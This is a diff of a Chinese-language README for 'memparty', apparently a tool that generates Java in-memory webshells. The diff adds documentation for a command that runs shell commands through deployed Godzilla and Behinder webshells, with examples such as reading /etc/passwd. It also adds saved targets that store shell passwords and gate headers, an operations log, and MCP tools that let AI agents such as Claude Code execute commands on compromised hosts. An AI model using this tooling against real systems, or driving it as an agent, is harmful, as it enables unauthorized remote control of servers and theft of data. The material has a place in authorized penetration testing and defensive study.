@@ -16,6 +16,12 @@
 - **覆盖全部端点** —— 内存马生成、探测马生成、配置查询、类名解析、版本查询。
 - **连接测试** —— `memparty connect` 验证已部署的 哥斯拉 / 冰蝎 / suo5 马是否存活、
   凭证是否正确（回显 / 握手双向校验）。
+- **命令执行** —— `memparty exec` 在已部署的哥斯拉 / 冰蝎马上执行命令并回显输出
+  （真实 `execCommand` / `Cmd` payload 往返）。
+- **命名目标** —— `memparty target save` 把 shell 存进项目（支持备注 + 分类），之后
+  `memparty exec web1/bh9060 --cmd "whoami"` 一个名字就够。
+- **操作日志** —— 每次 gen/probe/connect/exec/target 操作都追加到
+  `~/.memparty/operations.jsonl`，`memparty log` 按分类和目标查询。
 - **灵活的输出** —— payload 默认输出到 stdout，`-o file` 写文件（`.class`/`.jar` 自动
   base64 解码）。
 - **任意后端** —— 默认使用公共站点，可切换为自建实例。
@@ -132,6 +138,67 @@ memparty connect -u http://target/x -t godzilla --pass pass --key key \
 其他参数：`-H "Name: value"` 添加自定义请求头，`-k/--insecure` 跳过自签名 TLS 校验，
 `--json` 机器可读输出，`--timeout <ms>`（全局选项）。
 
+### 在已部署的马上执行命令
+
+`memparty exec` 通过已部署的哥斯拉 / 冰蝎 shell 执行命令，并打印远端 stdout+stderr。
+走的是真实协议 —— 哥斯拉调用 payload 的 `execCommand` 方法（argv 以 `arg-0..N` 传递，
+外面包 `cmd.exe /c` 或 `/bin/sh -c`）；冰蝎上传 `Cmd` payload 类（它自己根据远端
+`os.name` 选择 shell）。
+
+```bash
+# 哥斯拉 —— 默认先调 getBasicsInfo 自动探测远端系统（多一次请求）；
+# 传 --os windows|linux 可跳过探测
+memparty exec -u http://target/shell.jsp -t godzilla --pass pass --key key --cmd "whoami"
+
+# 冰蝎 —— payload 自己探测系统，无额外请求
+memparty exec -u http://target/shell.jsp -t behinder --pass rebeyond --cmd "cat /etc/passwd"
+```
+
+门禁头参数与 `connect` 相同；`--json` 返回 `{ ok, tool, url, command, output, durationMs }`，
+方便脚本与 agent 使用。
+
+### 命名目标（项目）
+
+保存一次，之后用名字引用 —— 不用再抄一串参数。shell 存放在**项目**里：一个项目
+归组同一次任务的多台 shell，并可带 `--remark` 备注和 `--category` 分类。
+存储文件为 `~/.memparty/targets.json`。
+
+```bash
+# 保存（项目自动创建；--remark/--category 是项目级属性，
+# --shell-remark 是这台 shell 自己的备注）
+memparty target save web1/bh9060 -u http://192.0.2.10:9060/console/service \
+  -t behinder --pass rebeyond --header-name User-Agent --header-value my-secret-token \
+  --remark "内网测试环境 WebSphere" --category test --shell-remark "root 权限"
+
+# 列出全部（可按 --category <名称> 过滤）
+memparty target list
+
+# 使用：<项目>/<shell>；项目里只有一个 shell 时光写项目名也行
+memparty connect web1/bh9060
+memparty exec web1 --cmd "whoami"
+
+# 改项目备注 / 改某台 shell 的备注 / 清理
+memparty target note web1 --remark "新备注" --category prod
+memparty target note web1/bh9060 --remark "新的 shell 备注"
+memparty target remove web1/bh9060   # 删单个 shell
+memparty target remove web1          # 删整个项目
+```
+
+显式参数仍会覆盖已存值（如 `memparty exec web1 --cmd id --pass 其他密码`）。
+
+### 操作日志
+
+每次操作（gen、probe、connect、exec、target save/note/remove）都以一行 JSON 追加到
+`~/.memparty/operations.jsonl` —— 记录目标、结果、耗时，exec 还记录命令和截断后的输出。
+凭证和 payload 内容不会写入日志。
+
+```bash
+memparty log                          # 最近 50 条，新的在前
+memparty log --category exec          # 只看命令执行
+memparty log --target web1           # 某个项目（或主机名子串）的全部操作
+memparty log --category connect --json
+```
+
 ## 示例
 
 端到端配方。**打包器**按投递途径选择，**shell 类型**按目标选择（Tomcat 10+ /
@@ -243,7 +310,8 @@ Claude Code / Claude Desktop 配置示例：
 ```
 
 暴露的工具：`list_servers`、`list_config`、`list_packers`、`list_command_configs`、
-`generate_memshell`、`generate_probe`、`parse_classname`、`server_version`、`connect_test`。
+`generate_memshell`、`generate_probe`、`parse_classname`、`server_version`、`connect_test`、
+`exec_command`、`target_save`、`target_note`、`target_list`、`target_remove`、`log_list`。
 
 ## AI 技能（Claude Code）
 
